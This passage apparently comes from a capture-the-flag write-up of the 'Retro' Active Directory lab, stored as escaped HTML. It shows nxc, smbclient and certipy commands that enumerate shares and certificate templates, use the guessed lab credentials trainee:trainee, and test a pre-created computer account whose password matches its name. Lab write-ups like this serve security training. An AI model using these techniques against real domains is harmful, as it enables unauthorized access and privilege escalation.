style=\"display:flex;\"\u003e\u003cspan\u003eEvil-WinRM shell v3.7\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eInfo: Establishing connection to remote endpoint\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eError: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eError: Exiting with code \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIt seems not, so I\u0026rsquo;ll check if this user unlocks more permissions on SMB shares.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:32:36 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u \u0026#39;trainee\u0026#39; -p \u0026#39;trainee\u0026#39; --shares\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003erainee:trainee\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumerated shares\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Share           Permissions     Remark\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               -----           -----------     ------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               ADMIN$                          Remote Admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               C$                              Default share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               IPC$            READ            Remote IPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               NETLOGON        READ            Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Notes           READ\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               SYSVOL          READ            Logon server share\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               Trainees        READ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe have read access to the Notes share.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:34:14 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# smbclient //10.10.98.67/Notes -U \u0026#34;trainee\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePassword \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eWORKGROUP\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003erainee\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTry \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;help\u0026#34;\u003c/span\u003e to get a list of possible commands.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e ls\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  .                                   D        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e  Mon Jul \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e 00:03:16 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ..                                DHS        \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e  Wed Jul \u003cspan style=\"color:#ae81ff\"\u003e26\u003c/span\u003e 11:54:14 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ToDo.txt                            A      \u003cspan style=\"color:#ae81ff\"\u003e248\u003c/span\u003e  Mon Jul \u003cspan style=\"color:#ae81ff\"\u003e24\u003c/span\u003e 00:05:56 \u003cspan style=\"color:#ae81ff\"\u003e2023\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#ae81ff\"\u003e6261499\u003c/span\u003e blocks of size 4096. \u003cspan style=\"color:#ae81ff\"\u003e2891768\u003c/span\u003e blocks available\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e get ToDo.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egetting file \u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eoDo.txt of size \u003cspan style=\"color:#ae81ff\"\u003e248\u003c/span\u003e as ToDo.txt \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e1.9 KiloBytes/sec\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eaverage 1.9 KiloBytes/sec\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmb: \u003cspan style=\"color:#ae81ff\"\u003e\\\u0026gt;\u003c/span\u003e exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:34:35 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# cat ToDo.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThomas,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eafter convincing the finance department to get rid of their ancient banking software\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eit is finally time to clean up the mess they made. We should start with the pre created\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecomputer account. That one is older than me.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eJames\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe can see that the company uses pre-created computers. If we refer to this \u003ca href=\"https://trustedsec.com/blog/diving-into-pre-created-computer-accounts\"\u003eblog post\u003c/a\u003e, if we find a computer with this attribute, its password will be the same as its name in lowercase.\u003c/p\u003e\n\u003cp\u003eIn the user list we created earlier, we can see an account with a computer name (BANKING$), let\u0026rsquo;s check if this is indeed the case.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:51:55 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc ldap 10.10.98.67 -u \u0026#39;trainee\u0026#39; -p \u0026#39;trainee\u0026#39; --query \u0026#34;(ObjectClass=user)\u0026#34; \u0026#34;*\u0026#34; | grep Computers\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLDAP                     10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Response \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e object: CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebanking,CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eComputers,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eretro,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLDAP                     10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               distinguishedName    CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ebanking,CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eComputers,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eretro,DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOk, now we potentially have a computer account. Let\u0026rsquo;s verify this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 16, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:38:13 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc smb 10.10.98.67 -u \u0026#39;banking$\u0026#39; -p \u0026#39;banking\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.121.126   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e x64 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003esigning:True\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSMBv1:False\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSMB         10.10.121.126   \u003cspan style=\"color:#ae81ff\"\u003e445\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\b\u003c/span\u003eanking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNow, I think we should explore the possibility of a vulnerability with AD CS, such as a misconfiguration of a certificate template.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:49:36 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nxc ldap 10.10.98.67 -u \u0026#39;trainee\u0026#39; -p \u0026#39;trainee\u0026#39; -M adcs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLDAP        10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2022\u003c/span\u003e Build \u003cspan style=\"color:#ae81ff\"\u003e20348\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ename:DC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain:retro.vl\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLDAP        10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e retro.vl\u003cspan style=\"color:#ae81ff\"\u003e\\t\u003c/span\u003erainee:trainee\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eADCS        10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Starting LDAP search with search filter \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;(objectClass=pKIEnrollmentService)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eADCS        10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               Found PKI Enrollment Server: DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eADCS        10.10.98.67     \u003cspan style=\"color:#ae81ff\"\u003e389\u003c/span\u003e    DC               Found CN: retro-DC-CA\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOk, with nxc\u0026rsquo;s adcs module we can indeed see that the DC also acts as an enrollment server.\nWe will now look for vulnerable templates with certipy.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 20:54:05 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# certipy find -u \u0026#39;trainee@retro.vl\u0026#39; -p \u0026#39;trainee\u0026#39; -dc-ip \u0026#39;10.10.98.67\u0026#39; -vulnerable -stdout\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCertipy v4.8.2 - by Oliver Lyak \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ely4k\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Finding certificate templates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Found \u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e certificate templates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Finding certificate authorities\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Found \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e certificate authority\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Found \u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e enabled certificate templates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Trying to get CA configuration \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;retro-DC-CA\u0026#39;\u003c/span\u003e via CSRA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e!\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Got error \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e trying to get CA configuration \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;retro-DC-CA\u0026#39;\u003c/span\u003e via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Trying to get CA configuration \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;retro-DC-CA\u0026#39;\u003c/span\u003e via RRP\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e!\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Failed to connect to remote registry. Service should be starting now. Trying again...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Got CA configuration \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;retro-DC-CA\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Enumeration output:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCertificate Authorities\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    CA Name                             : retro-DC-CA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    DNS Name                            : DC.retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Subject                 : CN\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eretro-DC-CA, DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eretro, DC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003evl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Validity Start          : 2023-07-23 21:03:51+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Validity End            : 2028-07-23 21:13:50+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Web Enrollment                      : Disabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    User Specified SAN                  : Disabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Request Disposition                 : Issue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Enforce Encryption \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e Requests     : Enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Permissions\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Owner                             : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Access Rights\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ManageCertificates              : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ManageCa                        : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrators\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Enroll                          : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003euthenticated Users\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCertificate 